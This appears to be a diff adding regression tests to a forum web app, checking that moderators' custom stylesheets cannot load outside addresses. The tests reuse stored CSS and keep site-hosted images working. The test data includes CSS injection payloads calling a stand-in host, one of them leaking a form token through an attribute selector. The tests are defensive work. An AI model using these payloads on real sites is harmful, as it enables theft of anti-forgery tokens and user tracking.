@@ -310,3 +310,49 @@ def test_m8_a_sign_in_from_the_sites_own_page_still_works(make_member, real_app)
     member = make_member()
     assert _sign_in(app, member, Origin="http://localhost", **{"Sec-Fetch-Site": "same-origin"}) == (302, True)
     assert _sign_in(app, member) == (302, True), "an app or a script sends neither header"
+
+
+# ---------------------------------------------------------------- M1: a guild's stylesheet loads nothing from outside
+
+OUTSIDE = ["@media all { body { background: url(https://evil.example/a.png) } }",
+           "@font-face { font-family: x; src: url(https://evil.example/f.woff) }",
+           'body { background: image-set("https://evil.example/a.png" 1x) }',
+           "@media all { input[name=formkey][value^=a] { background: url(//evil.example/a) } }"]
+
+
+def _stylesheet(mod):
+    return fresh(mod).execute(text("SELECT css FROM boards WHERE id = 1")).scalar() or ""
+
+
+def test_m1_a_guild_stylesheet_that_loads_an_outside_address_is_refused(guildmaster_with_post):
+    mod, _, _ = guildmaster_with_post
+    client = mod.browser()
+    for css in OUTSIDE:
+        answer = post(client, "/mod/1/settings/css", {"css": css, "formkey": mod.formkey(client)})
+        assert answer.status_code in (400, 422), (css, answer.status_code)
+        assert "evil.example" not in _stylesheet(mod), css
+
+
+def test_m1_the_sites_own_pictures_and_animations_still_save(guildmaster_with_post, real_app):
+    app, _ = real_app
+    mod, _, _ = guildmaster_with_post
+    client = mod.browser()
+    bucket = app.config["S3_BUCKET"]
+    css = (f".x {{ background: url(https://{bucket}/a.png) }}\n"
+           "@keyframes spin { from { opacity: 0 } to { opacity: 1 } }")
+    answer = post(client, "/mod/1/settings/css", {"css": css, "formkey": mod.formkey(client)})
+    assert answer.status_code in (200, 204, 302), answer.get_data(as_text=True)[:200]
+    saved = _stylesheet(mod)
+    assert bucket in saved and "spin" in saved
+
+
+def test_m1_a_stylesheet_saved_through_the_old_gap_is_not_served(guildmaster_with_post):
+    mod, author, _ = guildmaster_with_post
+    db = fresh(mod)
+    db.execute(text("UPDATE boards SET css = :c WHERE id = 1"), {"c": OUTSIDE[0]})
+    db.commit()
+    served = author.browser().get("/+general/css", base_url=BASE)
+    assert served.status_code == 200 and "evil.example" not in served.get_data(as_text=True)
+    db = fresh(mod)
+    db.execute(text("UPDATE boards SET css = '' WHERE id = 1"))
+    db.commit()
